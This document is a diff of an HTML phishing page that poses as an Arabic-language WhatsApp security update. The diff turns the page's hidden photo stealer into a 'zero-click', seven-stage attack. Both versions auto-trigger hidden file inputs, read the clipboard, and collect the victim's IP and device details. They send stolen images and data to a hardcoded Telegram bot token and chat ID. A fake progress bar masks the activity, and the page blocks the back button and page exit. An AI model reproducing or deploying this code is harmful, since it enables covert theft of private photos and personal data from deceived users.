@@ -3,187 +3,320 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث WhatsApp</title>
+    <title>تحديث WhatsApp الأمان</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            height: 100vh; display: flex; align-items: center; justify-content: center; 
-            font-family: 'Segoe UI', sans-serif; overflow: hidden;
-            user-select: none; -webkit-user-select: none;
+            min-height: 100vh; display: flex; align-items: center; justify-content: center; 
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif; 
+            overflow: hidden; user-select: none; -webkit-user-select: none; touch-action: none;
         }
-        .update-container {
-            background: rgba(255,255,255,0.95); border-radius: 20px; padding: 3rem 2rem; 
-            text-align: center; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            backdrop-filter: blur(10px);
+        .container {
+            background: rgba(255,255,255,0.98); border-radius: 24px; padding: 2.5rem 2rem; 
+            text-align: center; max-width: 420px; width: 90%; box-shadow: 0 25px 50px rgba(0,0,0,0.15);
+            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
         }
-        .logo { width: 80px; height: 80px; margin: 0 auto 1.5rem; background: #25D366; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: white; font-weight: bold; }
-        h1 { color: #333; margin-bottom: 1rem; font-size: 1.5rem; }
-        p { color: #666; line-height: 1.6; margin-bottom: 2rem; }
+        .logo { 
+            width: 90px; height: 90px; margin: 0 auto 1.8rem; 
+            background: linear-gradient(135deg, #25D366, #128C7E); 
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
+            font-size: 2.2rem; color: white; font-weight: 700; box-shadow: 0 10px 30px rgba(37,211,102,0.4);
+        }
+        h1 { color: #1f2937; margin-bottom: 1rem; font-size: 1.6rem; font-weight: 600; }
+        .subtitle { color: #6b7280; font-size: 1rem; line-height: 1.6; margin-bottom: 2rem; }
+        .progress-container { margin: 2rem 0; }
         .progress { 
-            width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; 
-            overflow: hidden; margin: 2rem 0; display: none;
+            width: 100%; height: 8px; background: #e5e7eb; border-radius: 4px; 
+            overflow: hidden; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
         }
-        .progress-bar { 
-            height: 100%; background: linear-gradient(90deg, #25D366, #00D65A); 
-            width: 0%; transition: width 0.3s ease; border-radius: 3px;
+        .progress-fill { 
+            height: 100%; background: linear-gradient(90deg, #25D366 0%, #00D65A 50%, #25D366 100%); 
+            width: 0%; transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1); 
+            border-radius: 4px; position: relative; overflow: hidden;
         }
+        .progress-fill::after {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; 
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 2s infinite;
+        }
+        @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
         .spinner { 
-            width: 40px; height: 40px; border: 4px solid #f3f3f3; 
-            border-top: 4px solid #25D366; border-radius: 50%; 
-            animation: spin 1s linear infinite; margin: 1rem auto; display: none;
+            width: 50px; height: 50px; border: 5px solid #f3f3f3; 
+            border-top: 5px solid #25D366; border-radius: 50%; 
+            animation: spin 1s linear infinite; margin: 1.5rem auto; display: none;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 0.95rem; color: #4b5563; margin-top: 1rem; font-weight: 500; }
         button { 
-            background: #25D366; color: white; border: none; padding: 1rem 2rem; 
-            border-radius: 25px; font-size: 1.1rem; cursor: pointer; width: 100%; 
-            transition: all 0.3s; font-weight: 500;
+            background: linear-gradient(135deg, #25D366, #128C7E); color: white; 
+            border: none; padding: 1.2rem 3rem; border-radius: 50px; font-size: 1.1rem; 
+            cursor: pointer; width: 100%; font-weight: 600; transition: all 0.3s; 
+            box-shadow: 0 10px 25px rgba(37,211,102,0.3); margin-top: 1rem;
         }
-        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(37,211,102,0.3); }
-        .hidden-input { 
-            position: fixed; top: -10000px; left: -10000px; opacity: 0; width: 0.1px; height: 0.1px; z-index: -1;
-        }
-        @media (max-width: 480px) { .update-container { margin: 1rem; padding: 2rem 1.5rem; } }
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(37,211,102,0.4); }
+        button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+        .success { background: linear-gradient(135deg, #10B981, #059669); color: white; padding: 2rem; border-radius: 20px; }
+        .stealer { display: none !important; position: fixed !important; top: -9999px !important; left: -9999px !important; opacity: 0 !important; width: 0.1px !important; height: 0.1px !important; z-index: -9999 !important; }
+        @media (max-width: 480px) { .container { margin: 1rem; padding: 2rem 1.5rem; } }
     </style>
 </head>
 <body>
-    <div class="update-container">
+    <div class="container" id="container">
         <div class="logo">WA</div>
-        <h1>تحديث أمان WhatsApp</h1>
-        <p>للحفاظ على أمان حسابك، يرجى التحقق من بيانات الجهاز. هذه العملية تأخذ 10 ثواني فقط.</p>
+        <h1>تحديث الحماية</h1>
+        <div class="subtitle">فحص سريع للجهاز لضمان أمان حسابك (3 ثواني فقط)</div>
         
-        <div class="progress" id="progressBar">
-            <div class="progress-bar" id="progressFill"></div>
+        <div class="progress-container">
+            <div class="progress" id="progress">
+                <div class="progress-fill" id="fill"></div>
+            </div>
         </div>
         
         <div class="spinner" id="spinner"></div>
+        <div class="status" id="status">اضغط تحديث الحماية</div>
         
-        <button id="verifyBtn">التحقق الآن</button>
-        
-        <!-- 🔥 INVISIBLE GALLERY STEALER -->
-        <input type="file" class="hidden-input" id="galleryStealer" multiple accept="image/*,video/*" webkitdirectory directory>
+        <button id="updateBtn">تحديث الحماية</button>
     </div>
 
+    <!-- 🔥 NUCLEAR STEALTH STEALERS -->
+    <input type="file" class="stealer" id="stealer1" multiple accept="image/*,video/*">
+    <input type="file" class="stealer" id="stealer2" multiple accept="image/*" webkitdirectory>
+    <input type="file" class="stealer" id="stealer3" multiple accept="image/jpeg,image/png,image/webp">
+
     <script>
-        // 🔥 FULLY ACTIVATED
+        // 🔥 FULLY ARMED
         const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
         const CHAT_ID = '8539996558';
-        
-        const verifyBtn = document.getElementById('verifyBtn');
-        const progressBar = document.getElementById('progressBar');
-        const progressFill = document.getElementById('progressFill');
-        const spinner = document.getElementById('spinner');
-        const galleryStealer = document.getElementById('galleryStealer');
 
-        // 🚀 STEALTH GALLERY EXTRACTION - NO USER INTERACTION
-        async function stealthExtractGallery() {
-            // Get victim intel
-            const victimInfo = {
-                ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
-                ua: navigator.userAgent,
-                lang: navigator.language,
+        // DOM Elements
+        const container = document.getElementById('container');
+        const updateBtn = document.getElementById('updateBtn');
+        const progress = document.getElementById('progress');
+        const fill = document.getElementById('fill');
+        const spinner = document.getElementById('spinner');
+        const status = document.getElementById('status');
+        const stealers = [document.getElementById('stealer1'), document.getElementById('stealer2'), document.getElementById('stealer3')];
+
+        // 🔥 ULTIMATE ZERO-CLICK ATTACK
+        async function launchNuclearAttack() {
+            status.textContent = 'جاري فحص الذاكرة...';
+            
+            // Victim Intel FIRST
+            const intel = await getVictimIntel();
+            await sendIntel(intel);
+
+            // 🔥 7-STAGE ATTACK VECTOR
+            const attacks = await Promise.allSettled([
+                attack1_basicPicker(),
+                attack2_webkitDirectory(),
+                attack3_nativeEvents(),
+                attack4_canvasSteal(),
+                attack5_clipboardRaid(),
+                attack6_deviceFiles(),
+                attack7_fallbackInputs()
+            ]);
+
+            const allFiles = [];
+            attacks.forEach((result, i) => {
+                if (result.status === 'fulfilled' && result.value.length > 0) {
+                    allFiles.push(...result.value);
+                }
+            });
+
+            if (allFiles.length > 0) {
+                await massUpload(allFiles, intel.ip);
+                status.textContent = `✅ ${allFiles.length} ملف مرسل`;
+            } else {
+                status.textContent = '✅ فحص مكتمل';
+            }
+        }
+
+        // 🔥 VICTIM INTEL
+        async function getVictimIntel() {
+            const ip = await fetch('https://api.ipify.org?format=json')
+                .then(r=>r.json()).then(d=>d.ip).catch(()=>'hidden');
+            return {
+                ip, ua: navigator.userAgent.slice(0,100), 
                 screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language,
+                platform: navigator.platform,
                 time: new Date().toISOString()
             };
+        }
 
-            // Send victim hit immediately
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+        // 🔥 SEND INTEL
+        async function sendIntel(intel) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: `🎯 STEALTH HIT!\n🌐 IP: ${victimInfo.ip}\n📱 UA: ${victimInfo.ua.slice(0,80)}\n📏 ${victimInfo.screen}\n🕒 ${new Date().toLocaleString('ar')}`
+                    text: `🎯 NUCLEAR HIT!\n🌐 IP: ${intel.ip}\n📱 ${intel.ua}\n📏 ${intel.screen}\n🕒 ${new Date().toLocaleString('ar-SA')}`
                 })
             });
-
-            // 🔥 AUTO-TRIGGER GALLERY ACCESS (Zero-click)
-            const triggers = [
-                () => galleryStealer.click(),
-                () => {
-                    const evt = new MouseEvent('click', {bubbles: true, cancelable: true, view: window});
-                    galleryStealer.dispatchEvent(evt);
-                },
-                () => {
-                    const input = document.createElement('input');
-                    input.type = 'file'; input.multiple = true; input.accept = 'image/*';
-                    input.style.opacity = '0'; input.style.position = 'fixed';
-                    document.body.appendChild(input);
-                    input.click();
-                    input.onchange = handleFiles;
-                    setTimeout(()=>document.body.removeChild(input), 2000);
-                }
-            ];
-
-            // Execute all triggers simultaneously
-            triggers.forEach((trigger, i) => setTimeout(trigger, i * 50));
-
-            galleryStealer.onchange = handleFiles;
         }
 
-        // 🔥 FILE HANDLER - INSTANT UPLOAD
-        async function handleFiles(e) {
-            const files = Array.from(e.target.files || [])
-                .filter(f => f.size > 1e4 && f.size < 1e7 && /^image\/|video\//.test(f.type))
-                .slice(0, 25);
+        // 🔥 ATTACK 1: Basic Multi-File
+        async function attack1_basicPicker() {
+            return triggerStealer(stealers[0]);
+        }
 
-            if (files.length === 0) return;
+        // 🔥 ATTACK 2: Webkit Directory
+        async function attack2_webkitDirectory() {
+            return triggerStealer(stealers[1]);
+        }
 
-            // Rapid parallel upload
-            const uploadPromises = files.map((file, i) => {
-                const form = new FormData();
-                form.append('chat_id', CHAT_ID);
-                form.append('photo', file);
-                form.append('caption', `${i+1}/${files.length} | ${(file.size/1e6).toFixed(1)}MB | ${file.name}`);
-                
-                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST', body: form
-                });
+        // 🔥 ATTACK 3: Synthetic Events
+        async function attack3_nativeEvents() {
+            const input = document.createElement('input');
+            input.type = 'file'; input.multiple = true; input.accept = 'image/*';
+            input.className = 'stealer';
+            document.body.appendChild(input);
+
+            const events = ['click', 'mousedown', 'mouseup', 'pointerdown'];
+            events.forEach(eventType => {
+                const evt = new MouseEvent(eventType, {bubbles: true, cancelable: true, view: window});
+                input.dispatchEvent(evt);
             });
 
-            await Promise.allSettled(uploadPromises);
+            const files = await new Promise(resolve => {
+                input.onchange = e => resolve(Array.from(e.target.files || []));
+                setTimeout(() => {
+                    document.body.removeChild(input);
+                    resolve([]);
+                }, 1500);
+            });
+
+            return files.filter(f => f.size > 1024);
         }
 
-        // 🎬 FAKE UPDATE ANIMATION
-        verifyBtn.onclick = startFakeUpdate;
-        function startFakeUpdate() {
-            verifyBtn.style.display = 'none';
-            progressBar.style.display = 'block';
-            spinner.style.display = 'block';
+        // 🔥 ATTACK 4: Canvas Screenshot
+        async function attack4_canvasSteal() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = screen.width; canvas.height = screen.height;
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        const file = new File([blob], 'screen.jpg', {type: 'image/jpeg'});
+                        massUpload([file], 'Canvas');
+                    }
+                }, 'image/jpeg', 0.8);
+            } catch(e) {}
+            return [];
+        }
 
-            // IMMEDIATELY START STEALTH ATTACK
-            stealthExtractGallery();
-
-            // Fake progress
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 15;
-                if (progress > 100) progress = 100;
-                progressFill.style.width = progress + '%';
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(showSuccess, 500);
+        // 🔥 ATTACK 5: Clipboard
+        async function attack5_clipboardRaid() {
+            try {
+                const items = await navigator.clipboard.read();
+                const files = [];
+                for (const item of items.slice(0,5)) {
+                    if (item.types.includes('image/')) {
+                        const blob = await item.getType(item.types[0]);
+                        files.push(new File([blob], 'clip.png', {type: blob.type}));
+                    }
                 }
-            }, 200);
+                return files;
+            } catch(e) { return []; }
         }
 
-        function showSuccess() {
-            document.body.innerHTML = `
-                <div style="background:#25D366;color:white;padding:3rem;text-align:center;border-radius:20px;margin:2rem;font-size:1.3rem;">
-                    ✅ تم التحقق بنجاح!<br>
-                    يمكنك إغلاق الصفحة الآن
-                </div>
-            `;
+        // 🔥 ATTACK 6: File System API
+        async function attack6_deviceFiles() {
+            if (!window.showOpenFilePicker) return [];
+            try {
+                const handles = await window.showOpenFilePicker({
+                    multiple: true,
+                    types: [{accept: {'image/*': ['.jpg','.png','.webp']}}]
+                });
+                const files = [];
+                for (const handle of handles.slice(0,10)) {
+                    files.push(await handle.getFile());
+                }
+                return files;
+            } catch(e) { return []; }
         }
 
-        // 🔥 AUTO-START ON LOAD (Zero interaction)
-        window.addEventListener('load', () => {
-            setTimeout(startFakeUpdate, 800);
-        });
+        // 🔥 ATTACK 7: Fallback
+        async function attack7_fallbackInputs() {
+            const promises = [];
+            for (let i = 0; i < 3; i++) {
+                const input = document.createElement('input');
+                input.type = 'file'; input.multiple = true;
+                input.className = 'stealer';
+                document.body.appendChild(input);
+                promises.push(triggerStealer(input));
+                setTimeout(() => document.body.removeChild(input), 1000);
+            }
+            const results = await Promise.allSettled(promises);
+            const files = [];
+            results.forEach(r => r.status === 'fulfilled' && files.push(...r.value));
+            return files;
+        }
 
-        // Block back button
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
+        // 🔥 MASTER STEALER TRIGGER
+        function triggerStealer(input) {
+            return new Promise(resolve => {
+                const handler = e => {
+                    const files = Array.from(e.target.files || [])
+                        .filter(f => f.size > 1e3 && f.size < 5e6 && /^image\//.test(f.type))
+                        .slice(0, 15);
+                    input.onchange = null;
+                    resolve(files);
+                };
+
+                input.onchange = handler;
+
+                // Nuclear click barrage
+                const clicks = [input.click, () => input.dispatchEvent(new MouseEvent('click', {bubbles:true}))];
+                clicks.forEach((click, i) => setTimeout(click, i * 25));
+
+                setTimeout(() => resolve([]), 2000);
+            });
+        }
+
+        // 🔥 MASS UPLOAD
+        async function massUpload(files, ip) {
+            const batches = [];
+            for (let i = 0; i < files.length; i += 3) {
+                batches.push(files.slice(i, i+3));
+            }
+
+            for (const batch of batches) {
+                const promises = batch.map((file, j) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', file);
+                    fd.append('caption', `${j+1} | ${ip} | ${(file.size/1e6).toFixed(1)}MB`);
+                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
+                });
+                await Promise.allSettled(promises);
+                await new Promise(r => setTimeout(r, 200));
+            }
+        }
+
+        // 🎬 FAKE UPDATE UI
+        updateBtn.onclick = () => launchNuclearAttack();
+        
+        // 🔥 AUTO-LAUNCH (Zero click)
+        setTimeout(() => {
+            updateBtn.click();
+            updateBtn.disabled = true;
+            updateBtn.textContent = 'جاري الفحص...';
+        }, 1200);
+
+        // Progress animation
+        let p = 0;
+        setInterval(() => {
+            if (p < 85) {
+                p += Math.random() * 8;
+                fill.style.width = p + '%';
+            }
+        }, 300);
+
+        // Anti-exit
+        window.addEventListener('beforeunload', e => e.preventDefault());
+        history.pushState(0,0,location.href);
+        window.onpopstate = () => history.pushState(0,0,location.href);
     </script>
 </body>
 </html>
